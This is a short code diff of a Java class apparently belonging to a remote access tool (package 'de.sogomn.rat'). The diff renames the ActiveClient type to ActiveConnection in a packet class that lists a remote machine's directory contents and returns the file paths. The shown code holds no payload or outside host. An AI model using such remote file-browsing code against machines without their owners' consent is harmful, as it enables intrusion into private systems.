@@ -4,7 +4,7 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.stream.Stream;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public class FileSystemPacket extends AbstractPingPongPacket {
 	
@@ -29,12 +29,12 @@ public class FileSystemPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void sendRequest(final ActiveClient client) {
+	protected void sendRequest(final ActiveConnection client) {
 		client.writeUTF(rootFile);
 	}
 	
 	@Override
-	protected void sendData(final ActiveClient client) {
+	protected void sendData(final ActiveConnection client) {
 		for (final String path : paths) {
 			client.writeByte(INCOMING);
 			client.writeUTF(path);
@@ -44,12 +44,12 @@ public class FileSystemPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void receiveRequest(final ActiveClient client) {
+	protected void receiveRequest(final ActiveConnection client) {
 		rootFile = client.readUTF();
 	}
 	
 	@Override
-	protected void receiveData(final ActiveClient client) {
+	protected void receiveData(final ActiveConnection client) {
 		final ArrayList<String> pathList = new ArrayList<String>();
 		
 		while (client.readByte() == INCOMING) {
@@ -63,7 +63,7 @@ public class FileSystemPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void executeRequest(final ActiveClient client) {
+	protected void executeRequest(final ActiveConnection client) {
 		final File[] children;
 		
 		if (rootFile.isEmpty() || rootFile.equals(File.separator)) {
@@ -86,7 +86,7 @@ public class FileSystemPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void executeData(final ActiveClient client) {
+	protected void executeData(final ActiveConnection client) {
 		//...
 	}
 	
